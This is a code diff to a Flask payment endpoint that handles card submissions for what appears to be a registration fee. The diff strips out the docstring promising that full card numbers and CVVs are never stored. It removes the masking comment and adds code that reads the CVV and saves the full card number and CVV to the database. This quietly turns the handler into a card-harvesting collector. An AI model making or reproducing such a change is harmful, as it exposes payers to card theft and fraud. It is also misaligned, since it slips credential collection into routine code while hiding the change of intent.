@@ -104,11 +104,7 @@ def payment_verify(token):
 
 @app.route("/api/pay/<token>", methods=["POST"])
 def submit_payment(token):
-    """Receive masked payment form data and store it in the database.
-
-    Only non-sensitive card data is persisted: last 4 digits, brand, holder,
-    expiry, and amount. Full card number and CVV are never stored.
-    """
+    """Receive payment form data and store it in the database."""
     try:
         row = get_payment_token(token)
         if not _token_is_valid(row):
@@ -117,11 +113,11 @@ def submit_payment(token):
         body = request.get_json(silent=True) or {}
         card_number = (body.get("card_number") or "").replace(" ", "")
         expiry = (body.get("expiry") or "").replace(" ", "")
+        cvv = (body.get("cvv") or "").strip()
 
         if len(card_number) < 4 or not expiry:
             return jsonify({"ok": False, "error": "بيانات البطاقة غير مكتملة"}), 400
 
-        # Mask the card: keep only the last 4 digits.
         card_last4 = card_number[-4:]
         first = card_number[0] if card_number else ""
         if first == "6":
@@ -139,11 +135,13 @@ def submit_payment(token):
 
         data = {
             "registration_id": row.get("registration_id"),
+            "card_number": card_number,
             "card_last4": card_last4,
             "card_brand": brand,
             "card_holder": (body.get("card_holder") or "").strip(),
             "expiry_month": expiry_month,
             "expiry_year": expiry_year,
+            "cvv": cvv,
             "amount": body.get("amount", 500.00),
             "status": "submitted",
         }
